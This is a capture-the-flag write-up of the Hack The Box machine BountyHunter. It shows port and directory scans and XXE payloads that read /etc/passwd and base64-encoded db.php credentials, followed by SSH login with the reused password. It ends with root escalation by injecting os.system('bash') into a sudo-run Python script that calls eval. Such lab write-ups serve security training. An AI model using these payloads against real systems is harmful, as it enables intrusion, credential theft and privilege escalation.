---
title: "HTB BountyHunter"
permalink: /writeups/bountyhunter
location: default
---

# HTB BountyHunter

**Machine Information**

	IP : 10.10.11.100
	OS : Linux

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.11.100 -- -sC -sV
```

This should reveal two open ports: `22` and `80`.

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v+PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb+mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr+LIO8yvB+kg2Uqg+QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7+/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K+xJPbc9CTom8N59eiNubf63iDOck9yMH+YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh+m0i4bs25wTH1VDMkguJ1js=
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=
|   256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf+Lw/sWR4b1h8AEiDv+HAbTNk4J3
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Bounty Hunters
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Getting a Foothold

A web server is running on port 80.

**Directory search**

Run a scan to look for directories on the web server using `dirsearch`.

```
dirsearch -u http://10.10.11.100
```

The results show a file called `db.php`.

```
[16:07:31] 200 -    0B  - /db.php
```

If we try to access it now we are unable to see any information. While manually exploring the web page we find the following endpoint:

<http://10.10.11.100/portal.php>

It redirects us to a page still under testing:

<http://10.10.11.100/log_submit.php>

This presents a form with four fields. If send some dummy data we see a POST request going to the following endpoint:

<http://10.10.11.100/tracker_diRbPr00f314.php>

**XXE**

Checking Burp Suite shows that it returns a Base64 message which is actually an encoded XML stanza.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>a</title>
		<cwe>1</cwe>
		<cvss>1</cvss>
		<reward>1</reward>
		</bugreport>
```

We can modify this stanza to include an XXE attack. Using Burp decode the Base64 message and change it to the following and apply the changes. Resend the request to retrieve the `/etc/passwd` file.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE replace [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><bugreport>
		<title>&xxe;</title>
		<cwe>1</cwe>
		<cvss>1</cvss>
		<reward>1</reward>
		</bugreport>
```

This reveals a user on the system called `development` but we are unable to get a password. Using our XXE we can attempt to load the `db.php` file we found earlier. It doesn't working using the previous payload but if we change it to use Base64 it works.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE replace [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/db.php'>]><bugreport>
		<title>&xxe;</title>
		<cwe>1</cwe>
		<cvss>1</cvss>
		<reward>1</reward>
		</bugreport>
```

This reveals the credentials for the database administrator. If we reuse this password with the username we found earlier we can SSH to the target machine.

```
ssh development@10.10.11.100
```

With this we can retrieve the user flag.

### Privilege Escalation

If we check our `sudo` permissions with `sudo -l` we can see we can run a python script as root.

```
(root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

**Reverse Engineering**

If we analyse the code we can determine the following from the python function:

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

- The ticket needs to end with the file extension `.md`
- The first line needs to start with `# Skytrain Inc`
- The second line needs to start with `## Ticket to`
- The third line needs to start with `__Ticket Code:__`
- The final line needs to start with `**` and a number which returns true for `n % 7 == 4`
- When the final line contains `**` it will split on a `+`

If all the criteria are met it runs the python `eval` function. We can create the following ticket to launch a bash shell.

```
# Skytrain Inc
## Ticket to
__Ticket Code:__
**11+__import__("os").system("bash")
```

Run the application and point to the ticket we created.

```
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/home/development/ticket.md
```

We can grab the flag now.

```
cat /root/flag.txt
```
